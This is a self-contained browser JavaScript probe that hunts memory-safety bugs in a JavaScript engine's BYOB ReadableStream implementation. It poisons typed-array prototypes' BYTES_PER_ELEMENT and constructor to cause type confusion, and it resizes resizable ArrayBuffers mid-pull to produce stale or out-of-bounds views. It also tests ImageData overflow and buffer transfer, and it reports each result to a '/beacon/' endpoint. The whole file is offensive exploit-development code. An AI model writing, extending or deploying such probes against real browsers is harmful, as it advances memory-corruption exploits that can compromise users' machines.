// p350 - BYOB ReadableStream prototype pollution + RAB TOCTOU
// Target: ReadableByteStreamInternals.js line 610/619 reads BYTES_PER_ELEMENT
// and constructor from prototype (unsafe per FIXME). convertDescriptor at
// line 570 creates new ctor(buffer, offset, bytesFilled/elementSize).
// transferBufferToCurrentRealm is a no-op (line 301-310).
// Beacon prefix: V350-

(function() {
  var BQ = 0;
  function B(tag) {
    try { new Image().src = '/beacon/V350-' + tag + '?t=' + Date.now() + '&q=' + (BQ++); } catch(e) {}
  }

  B('BOOT');

  // Feature gate: ReadableStream BYOB
  try {
    var testStream = new ReadableStream({ type: 'bytes', pull: function() {} });
    var testReader = testStream.getReader({ mode: 'byob' });
    testReader.releaseLock();
    B('BYOB-OK');
  } catch(e) {
    B('NO-BYOB-' + e.message.substring(0, 30));
    return;
  }

  // Feature gate: RAB
  try { new ArrayBuffer(8, {maxByteLength: 64}); } catch(e) { B('NO-RAB'); return; }

  // =========================================================
  // TEST 1: Prototype pollution - override BYTES_PER_ELEMENT
  // If the BYOB code reads from prototype, elementSize will be wrong
  // =========================================================
  try {
    var t1resolve;
    var t1pulled = false;
    var stream1 = new ReadableStream({
      type: 'bytes',
      pull: function(controller) {
        if (t1pulled) return;
        t1pulled = true;
        B('T1-PULL');
        var view = controller.byobRequest.view;
        B('T1-VIEW-TYPE-' + view.constructor.name);
        B('T1-VIEW-LEN-' + view.byteLength);
        // Fill 16 bytes
        for (var i = 0; i < Math.min(16, view.byteLength); i++) view[i] = 0x41 + i;
        controller.respond(Math.min(16, view.byteLength));
      }
    });

    var reader1 = stream1.getReader({ mode: 'byob' });

    // Poison: make Float64Array.prototype.BYTES_PER_ELEMENT return 1
    var origBPE = Object.getOwnPropertyDescriptor(Float64Array.prototype, 'BYTES_PER_ELEMENT');
    try {
      Object.defineProperty(Float64Array.prototype, 'BYTES_PER_ELEMENT', {
        value: 1, writable: false, enumerable: false, configurable: true
      });
      B('T1-POISON-BPE-1');
    } catch(e) {
      B('T1-POISON-FAIL-' + e.message.substring(0, 30));
    }

    var buf1 = new ArrayBuffer(128);
    var view1 = new Float64Array(buf1, 0, 16); // 16 Float64s = 128 bytes
    B('T1-BPE-CHECK-' + view1.BYTES_PER_ELEMENT);

    reader1.read(view1).then(function(result) {
      var v = result.value;
      B('T1-RESULT-TYPE-' + (v ? v.constructor.name : 'null'));
      B('T1-RESULT-LEN-' + (v ? v.byteLength : -1));
      B('T1-RESULT-ELEN-' + (v ? v.length : -1));
      if (v && v.byteLength > 128) {
        B('T1-OOB-VIEW-' + v.byteLength);
      }
      // Restore
      if (origBPE) Object.defineProperty(Float64Array.prototype, 'BYTES_PER_ELEMENT', origBPE);
    }).catch(function(e) {
      B('T1-ERR-' + e.message.substring(0, 40));
      if (origBPE) Object.defineProperty(Float64Array.prototype, 'BYTES_PER_ELEMENT', origBPE);
    });
  } catch(e) {
    B('T1-OUTER-ERR-' + e.message.substring(0, 30));
    try { Object.defineProperty(Float64Array.prototype, 'BYTES_PER_ELEMENT', origBPE); } catch(e2) {}
  }

  // =========================================================
  // TEST 2: Constructor override - swap Float64Array ctor to Uint8Array
  // convertDescriptor: new ctor(buffer, offset, bytesFilled/elementSize)
  // If ctor=Uint8Array and elementSize=8, creates Uint8Array(buf,0,N/8)
  // If ctor=Uint8Array and elementSize=1 (poisoned), creates Uint8Array(buf,0,N)
  // =========================================================
  setTimeout(function() {
    try {
      var t2pulled = false;
      var stream2 = new ReadableStream({
        type: 'bytes',
        pull: function(controller) {
          if (t2pulled) return;
          t2pulled = true;
          B('T2-PULL');
          var view = controller.byobRequest.view;
          B('T2-VIEW-BLEN-' + view.byteLength);
          for (var i = 0; i < Math.min(64, view.byteLength); i++) view[i] = 0xCC;
          controller.respond(Math.min(64, view.byteLength));
        }
      });

      var reader2 = stream2.getReader({ mode: 'byob' });

      // Poison constructor
      var origCtor = Float64Array.prototype.constructor;
      Float64Array.prototype.constructor = Uint8Array;
      B('T2-CTOR-POISONED');

      var buf2 = new ArrayBuffer(64);
      var view2 = new Float64Array(buf2, 0, 8); // 8 Float64s = 64 bytes

      reader2.read(view2).then(function(result) {
        var v = result.value;
        B('T2-RESULT-TYPE-' + (v ? v.constructor.name : 'null'));
        B('T2-RESULT-LEN-' + (v ? v.byteLength : -1));
        B('T2-RESULT-ELEN-' + (v ? v.length : -1));
        // If we got Uint8Array instead of Float64Array, type confusion succeeded
        if (v && v.constructor === Uint8Array) {
          B('T2-TYPE-CONFUSED');
          // Check if we got more elements than expected
          if (v.length > 8) B('T2-EXPANDED-' + v.length);
        }
        Float64Array.prototype.constructor = origCtor;
      }).catch(function(e) {
        B('T2-ERR-' + e.message.substring(0, 40));
        Float64Array.prototype.constructor = origCtor;
      });
    } catch(e) { B('T2-OUTER-ERR-' + e.message.substring(0, 30)); }
  }, 500);

  // =========================================================
  // TEST 3: RAB resize during BYOB pull - stale descriptor values
  // pullIntoDescriptor captures byteOffset/byteLength at read() time.
  // If we resize the buffer in the pull function, the descriptor
  // has stale values. transferBufferToCurrentRealm is a no-op.
  // =========================================================
  setTimeout(function() {
    try {
      var rab3 = new ArrayBuffer(256, {maxByteLength: 4096});
      var t3pulled = false;
      var stream3 = new ReadableStream({
        type: 'bytes',
        pull: function(controller) {
          if (t3pulled) return;
          t3pulled = true;
          B('T3-PULL');
          var view = controller.byobRequest.view;
          B('T3-VIEW-BLEN-' + view.byteLength);
          B('T3-BUF-BLEN-' + rab3.byteLength);

          // Resize buffer DOWN before responding
          rab3.resize(16);
          B('T3-RESIZED-TO-16');
          B('T3-BUF-AFTER-' + rab3.byteLength);
          B('T3-VIEW-AFTER-' + view.byteLength);

          // Write 8 bytes (within new buffer bounds)
          try {
            for (var i = 0; i < 8; i++) view[i] = 0xDD;
            B('T3-WRITE-OK');
          } catch(e) {
            B('T3-WRITE-ERR-' + e.message.substring(0, 30));
          }

          // Respond with 8 bytes. Descriptor has stale byteLength=256
          // Check: does respond() validate against current buffer size?
          try {
            controller.respond(8);
            B('T3-RESPOND-OK');
          } catch(e) {
            B('T3-RESPOND-ERR-' + e.message.substring(0, 40));
          }
        }
      });

      var reader3 = stream3.getReader({ mode: 'byob' });
      var view3 = new Uint8Array(rab3, 0, 256);
      B('T3-READ-START-LEN-' + view3.byteLength);

      reader3.read(view3).then(function(result) {
        var v = result.value;
        B('T3-RESULT-TYPE-' + (v ? v.constructor.name : 'null'));
        B('T3-RESULT-LEN-' + (v ? v.byteLength : -1));
        B('T3-RESULT-BUFLEN-' + (v && v.buffer ? v.buffer.byteLength : -1));
        // Check if we got a view larger than the resized buffer
        if (v && v.byteLength > 16) {
          B('T3-STALE-VIEW-' + v.byteLength + '-vs-buf-' + v.buffer.byteLength);
        }
      }).catch(function(e) {
        B('T3-READ-ERR-' + e.message.substring(0, 40));
      });
    } catch(e) { B('T3-OUTER-ERR-' + e.message.substring(0, 30)); }
  }, 1500);

  // =========================================================
  // TEST 4: Combined: RAB + prototype poison + resize during pull
  // Most aggressive: poison elementSize, override ctor, resize buffer
  // =========================================================
  setTimeout(function() {
    try {
      var rab4 = new ArrayBuffer(512, {maxByteLength: 8192});
      var t4pulled = false;

      var stream4 = new ReadableStream({
        type: 'bytes',
        pull: function(controller) {
          if (t4pulled) return;
          t4pulled = true;
          B('T4-PULL');

          // Resize buffer UP to max
          rab4.resize(8192);
          B('T4-RESIZED-UP-' + rab4.byteLength);

          var view = controller.byobRequest.view;
          B('T4-VIEW-BLEN-' + view.byteLength);

          // Fill first 512 bytes (original descriptor byteLength)
          var fillLen = Math.min(view.byteLength, 512);
          for (var i = 0; i < fillLen; i++) view[i] = i & 0xFF;
          try {
            controller.respond(fillLen);
            B('T4-RESPOND-OK-' + fillLen);
          } catch(e) {
            B('T4-RESPOND-ERR-' + e.message.substring(0, 40));
          }
        }
      });

      var reader4 = stream4.getReader({ mode: 'byob' });

      // Poison BYTES_PER_ELEMENT temporarily
      var origBPE4;
      try {
        origBPE4 = Object.getOwnPropertyDescriptor(Uint8Array.prototype, 'BYTES_PER_ELEMENT');
        Object.defineProperty(Uint8Array.prototype, 'BYTES_PER_ELEMENT', {
          value: 1, configurable: true
        });
      } catch(e) { B('T4-POISON-FAIL'); }

      var view4 = new Uint8Array(rab4, 0, 512);
      B('T4-READ-START');

      reader4.read(view4).then(function(result) {
        // Restore before processing
        try { Object.defineProperty(Uint8Array.prototype, 'BYTES_PER_ELEMENT', origBPE4); } catch(e) {}

        var v = result.value;
        B('T4-RESULT-TYPE-' + (v ? v.constructor.name : 'null'));
        B('T4-RESULT-LEN-' + (v ? v.byteLength : -1));
        B('T4-RESULT-ELEN-' + (v ? v.length : -1));
        B('T4-RESULT-BUFLEN-' + (v && v.buffer ? v.buffer.byteLength : -1));
        B('T4-RESULT-BUFMAX-' + (v && v.buffer ? (v.buffer.maxByteLength || 'none') : -1));
      }).catch(function(e) {
        try { Object.defineProperty(Uint8Array.prototype, 'BYTES_PER_ELEMENT', origBPE4); } catch(e2) {}
        B('T4-ERR-' + e.message.substring(0, 40));
      });
    } catch(e) { B('T4-OUTER-ERR-' + e.message.substring(0, 30)); }
  }, 3000);

  // =========================================================
  // TEST 5: Canvas ImageData large dimension overflow
  // width * height * 4 could overflow in 32-bit math
  // =========================================================
  setTimeout(function() {
    try {
      // Test large ImageData creation
      // 46341 * 46341 = 2147488281 (just over INT32_MAX)
      // * 4 = 8589953124 (would overflow uint32)
      try {
        var c = document.createElement('canvas');
        c.width = 100; c.height = 100;
        var ctx = c.getContext('2d');
        if (!ctx) { B('T5-NO-CANVAS'); return; }
        B('T5-CANVAS-OK');

        // Try creating ImageData with moderate-but-tricky dimensions
        // 32768 * 32768 * 4 = 4294967296 = exactly 2^32
        try {
          var id1 = new ImageData(32768, 32768);
          B('T5-IMGDATA-32K-OK-' + id1.data.length);
        } catch(e) {
          B('T5-IMGDATA-32K-ERR-' + e.message.substring(0, 30));
        }

        // Smaller but still interesting: 16384 * 16384 = 1073741824 bytes
        try {
          var id2 = new ImageData(16384, 16384);
          B('T5-IMGDATA-16K-OK-' + id2.data.length);
        } catch(e) {
          B('T5-IMGDATA-16K-ERR-' + e.message.substring(0, 30));
        }

        // Test putImageData with offset: can offsets cause OOB?
        try {
          var id3 = new ImageData(100, 100);
          for (var i = 0; i < id3.data.length; i++) id3.data[i] = 0xFF;
          ctx.putImageData(id3, -50, -50); // negative offsets
          B('T5-PUT-NEG-OK');
          ctx.putImageData(id3, 99999, 99999); // huge offsets
          B('T5-PUT-HUGE-OK');
          // Dirty rect with inverted coords
          ctx.putImageData(id3, 0, 0, 50, 50, -10, -10);
          B('T5-PUT-DIRTY-OK');
        } catch(e) {
          B('T5-PUT-ERR-' + e.message.substring(0, 30));
        }

        // Test createImageBitmap with out-of-range crop
        try {
          createImageBitmap(c, -100, -100, 300, 300).then(function(bmp) {
            B('T5-BITMAP-OK-' + bmp.width + 'x' + bmp.height);
          }).catch(function(e) {
            B('T5-BITMAP-ERR-' + e.message.substring(0, 30));
          });
        } catch(e) {
          B('T5-BITMAP-SYNC-ERR-' + e.message.substring(0, 30));
        }
      } catch(e) {
        B('T5-INNER-ERR-' + e.message.substring(0, 30));
      }
    } catch(e) { B('T5-OUTER-ERR-' + e.message.substring(0, 30)); }
  }, 4500);

  // =========================================================
  // TEST 6: structuredClone with transfer of resizable buffer
  // Does transfer properly handle resizable buffers?
  // =========================================================
  setTimeout(function() {
    try {
      var rab6 = new ArrayBuffer(256, {maxByteLength: 4096});
      var v6 = new Uint8Array(rab6);
      for (var i = 0; i < 256; i++) v6[i] = 0xEE;

      B('T6-PRE-CLONE-LEN-' + rab6.byteLength);
      B('T6-PRE-CLONE-MAX-' + rab6.maxByteLength);

      try {
        // Transfer the resizable buffer
        var cloned = structuredClone(rab6, { transfer: [rab6] });
        B('T6-CLONE-OK');
        B('T6-ORIG-DETACHED-' + (rab6.byteLength === 0));
        B('T6-CLONE-LEN-' + cloned.byteLength);
        B('T6-CLONE-MAX-' + (cloned.maxByteLength || 'none'));
        B('T6-CLONE-RESIZABLE-' + (cloned.resizable || false));

        // Can we resize the clone?
        if (cloned.resizable) {
          try {
            cloned.resize(512);
            B('T6-RESIZE-OK-' + cloned.byteLength);
          } catch(e) {
            B('T6-RESIZE-ERR-' + e.message.substring(0, 30));
          }
        }

        // Check data integrity
        var cv = new Uint8Array(cloned);
        var sum = 0;
        for (var i = 0; i < Math.min(cv.length, 32); i++) sum += cv[i];
        B('T6-DATA-SUM32-' + sum);
      } catch(e) {
        B('T6-CLONE-ERR-' + e.message.substring(0, 40));
      }

      // Test: clone with view + transfer buffer
      try {
        var rab6b = new ArrayBuffer(128, {maxByteLength: 2048});
        var v6b = new Float64Array(rab6b);
        for (var i = 0; i < 16; i++) v6b[i] = 1000 + i;

        // Resize down before clone
        rab6b.resize(32);
        B('T6B-RESIZED-' + rab6b.byteLength);
        B('T6B-VIEW-LEN-' + v6b.length); // should be 4 (32/8)

        try {
          var cloned6b = structuredClone(v6b, { transfer: [rab6b] });
          B('T6B-CLONE-TYPE-' + cloned6b.constructor.name);
          B('T6B-CLONE-LEN-' + cloned6b.length);
          B('T6B-CLONE-BUFLEN-' + cloned6b.buffer.byteLength);
          B('T6B-CLONE-BUFMAX-' + (cloned6b.buffer.maxByteLength || 'none'));
        } catch(e) {
          B('T6B-CLONE-ERR-' + e.message.substring(0, 40));
        }
      } catch(e) {
        B('T6B-ERR-' + e.message.substring(0, 30));
      }
    } catch(e) { B('T6-OUTER-ERR-' + e.message.substring(0, 30)); }
  }, 6000);

  // =========================================================
  // TEST 7: MessageChannel transfer of RAB
  // Post resizable buffer through MessageChannel
  // =========================================================
  setTimeout(function() {
    try {
      var mc = new MessageChannel();
      var rab7 = new ArrayBuffer(512, {maxByteLength: 8192});
      var v7 = new Uint8Array(rab7);
      for (var i = 0; i < 512; i++) v7[i] = 0xAB;

      mc.port2.onmessage = function(ev) {
        var buf = ev.data;
        B('T7-RECV-TYPE-' + buf.constructor.name);
        B('T7-RECV-LEN-' + buf.byteLength);
        B('T7-RECV-MAX-' + (buf.maxByteLength || 'none'));
        B('T7-RECV-RESIZABLE-' + (buf.resizable || false));

        if (buf.resizable) {
          try {
            buf.resize(1024);
            B('T7-RECV-RESIZE-OK-' + buf.byteLength);
          } catch(e) {
            B('T7-RECV-RESIZE-ERR-' + e.message.substring(0, 30));
          }
        }

        var rv = new Uint8Array(buf);
        var rsum = 0;
        for (var i = 0; i < Math.min(32, rv.length); i++) rsum += rv[i];
        B('T7-RECV-SUM32-' + rsum);
      };

      // Resize down, then transfer
      rab7.resize(64);
      B('T7-PRE-SEND-LEN-' + rab7.byteLength);

      try {
        mc.port1.postMessage(rab7, [rab7]);
        B('T7-SENT-OK');
        B('T7-ORIG-DETACHED-' + (rab7.byteLength === 0));
      } catch(e) {
        B('T7-SEND-ERR-' + e.message.substring(0, 40));
      }
    } catch(e) { B('T7-OUTER-ERR-' + e.message.substring(0, 30)); }
  }, 7500);

  B('DONE');
  setTimeout(function() { B('TIMEOUT'); }, 20000);
})();
